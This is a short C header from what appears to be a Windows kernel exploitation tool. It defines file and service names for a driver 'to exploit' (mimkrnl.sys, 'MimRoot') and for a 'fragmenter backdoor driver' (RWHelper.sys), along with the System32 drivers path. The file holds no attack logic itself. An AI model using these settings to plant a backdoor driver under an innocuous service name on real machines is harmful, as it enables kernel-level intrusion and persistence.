#pragma once

// Name of the driver to exploit on disk
#define MIMKRNL_NAME			"mimkrnl.sys"
// Name of the service
#define MIMKRNL_DISPLAY_NAME	"MimRoot"

// Name of the fragmenter backdoor driver on disk
#define FRAGMENTER_NAME			"RWHelper.sys"
// Name of the service
#define FRAGMENTER_DISPLAY_NAME	"Fragmenter"

#define DRIVER_PATH				"C:\\Windows\\System32\\drivers\\"